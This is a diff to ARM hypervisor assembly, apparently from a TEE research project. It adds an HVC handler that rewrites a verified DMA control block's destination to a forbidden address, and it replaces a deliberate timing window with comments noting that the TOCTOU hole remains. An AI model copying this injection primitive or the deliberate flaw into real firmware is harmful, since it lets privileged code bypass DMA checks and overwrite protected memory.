@@ -661,6 +661,34 @@ save:
 	__ERET
 .LTORG
 
+1:	teq	r0, #MYTEE_TOCTOU_INJECT
+	bne	1f
+	// TOCTOU Attack: Hypervisor directly modifies CB in secure buffer
+	// r1 = secure buffer virtual address (passed from driver)
+	// r2 = target (forbidden) physical address for CB.dst
+	//
+	// CB Structure (32 bytes):
+	//   offset 0x00: Transfer Information (TI)
+	//   offset 0x04: Source Address (SRC)
+	//   offset 0x08: Destination Address (DST) <- We modify this
+	//   offset 0x0C: Transfer Length
+	//   offset 0x10: 2D Stride
+	//   offset 0x14: Next CB Address
+	//   offset 0x18: Reserved
+	//   offset 0x1C: Reserved
+	
+	// Modify DST field (offset 0x08) to point to kernel memory
+	str	r2, [r1, #0x08]
+	
+	// Memory barrier to ensure write completes
+	dsb
+	isb
+	
+	// Return success
+	mov	r0, #0
+	__ERET
+.LTORG
+
 1:
 #endif	
 
@@ -1353,57 +1381,13 @@ b 99f
 	add	r2, r2, #BCM2837_BUS_VIRT_OFFSET	// change to secure buffer bus address from first 
 			// DMA CB address bus address(which be mapped to bcm2835 dma phys address 0x3f007000)
 
-	// ========== TOCTOU VULNERABILITY WINDOW ==========
-	// This intentional delay demonstrates the TOCTOU vulnerability.
-	// After verification passes, we wait before allowing DMA execution.
-	// During this window, an attacker with EL2 privilege can modify
-	// the CB in secure buffer to point to a forbidden destination.
+	// NOTE: TOCTOU vulnerability exists here!
+	// An attacker with EL2 privilege can call MYTEE_TOCTOU_INJECT HVC
+	// to modify the CB in secure buffer AFTER verification passes
+	// but BEFORE DMA execution continues below.
 	//
-	// In real attack: attacker on another core polls for this window
-	// Here: we use a fixed delay to guarantee the window is open
-	
-	push	{r0, r1, r2, r3, lr}
-	
-	// Signal that verification is complete (for attacker polling)
-	ldr	r0, =TOCTOU_SYNC_FLAG_VIRT
-	ldr	r1, =TOCTOU_SYNC_STATE_HYP_READY
-	str	r1, [r0]
-	dmb
-	dsb
-	
-	// *** INTENTIONAL DELAY - TOCTOU WINDOW ***
-	// Wait ~100ms (at ~1GHz, ~100M cycles, but we use smaller loop)
-	// This gives attacker plenty of time to modify CB
-	ldr	r3, =0x00100000		// ~1M iterations = ~10-50ms
-78:
-	subs	r3, r3, #1
-	bne	78b
-	
-	// Check if attacker modified the flag (optional early exit)
-	ldr	r0, =TOCTOU_SYNC_FLAG_VIRT
-	ldr	r1, =TOCTOU_SYNC_STATE_ATTACKER_DONE
-	ldr	r3, [r0]
-	cmp	r3, r1
-	beq	79f			// Attacker done, exit early
-	
-	// Extra wait if attacker still working
-	ldr	r3, =0x00080000		// Additional ~500K iterations
-78:
-	subs	r3, r3, #1
-	bne	78b
-
-79:	// Attacker done or timeout
-	// Clear sync flag
-	ldr	r0, =TOCTOU_SYNC_FLAG_VIRT
-	mov	r3, #0
-	str	r3, [r0]
-	dmb
-	dsb
-	
-	pop	{r0, r1, r2, r3, lr}
-	// ========== TOCTOU WINDOW END ==========
-	// At this point, CB in secure buffer may have been modified!
-	// DMA will execute with potentially malicious destination
+	// The MYTEE_TOCTOU_INJECT (150) HVC handler allows direct
+	// modification of CB.dst field in secure buffer.
 
 	b	200f
 214:	// load saved context to r2	(verify skip)
